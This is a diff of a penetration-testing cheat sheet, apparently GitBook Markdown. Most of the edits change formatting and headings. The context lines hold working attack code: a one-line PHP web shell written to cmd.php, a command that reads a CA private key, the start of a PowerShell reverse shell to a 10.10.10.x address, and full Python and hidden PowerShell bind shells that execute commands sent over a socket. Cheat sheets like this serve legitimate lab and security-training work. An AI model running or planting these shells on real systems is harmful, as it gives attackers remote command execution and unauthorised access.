@@ -95,8 +95,6 @@ stty rows <NUMBER> columns <NUMBER>
 
 ***
 
-## <mark style="color:purple;">Shells</mark>
-
 {% hint style="info" %}
 ## <mark style="color:red;">`Spawning Shells`</mark>
 
@@ -229,7 +227,7 @@ echo file_get_contents("home/nairobi/ca.key")
 
 ***
 
-{% hint style="warning" %}
+{% hint style="info" %}
 ## <mark style="color:red;">`Web Shells`</mark>
 
 ### <mark style="color:orange;">`PHP`</mark>
@@ -269,7 +267,7 @@ echo '<?php system($_REQUEST['cmd']); ?>' > cmd.php
 
 ***
 
-{% hint style="danger" %}
+{% hint style="info" %}
 ## <mark style="color:red;">`Reverse Shells`</mark>
 
 ### <mark style="color:orange;">`BASH`</mark> <mark style="color:purple;">Reverse Shells</mark>
@@ -391,7 +389,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 ***
 
 {% hint style="info" %}
-## <mark style="color:purple;">Bind Shells</mark>
+## <mark style="color:red;">`Bind Shells`</mark>
 
 * <mark style="color:purple;">First, find ports were</mark> <mark style="color:orange;">**`inbound`**</mark> <mark style="color:purple;">connections are allowed:</mark>
 
@@ -420,15 +418,13 @@ netsh advfirewall firewall show rule name=all
 
 ***
 
-### <mark style="color:purple;">Shells</mark>
-
-{% code overflow="wrap" %}
+{% code title="Python Shell" overflow="wrap" %}
 ```sh
 python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
 ```
 {% endcode %}
 
-{% code title="Windows" overflow="wrap" %}
+{% code title="Powershell" overflow="wrap" %}
 ```powershell
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
 ```
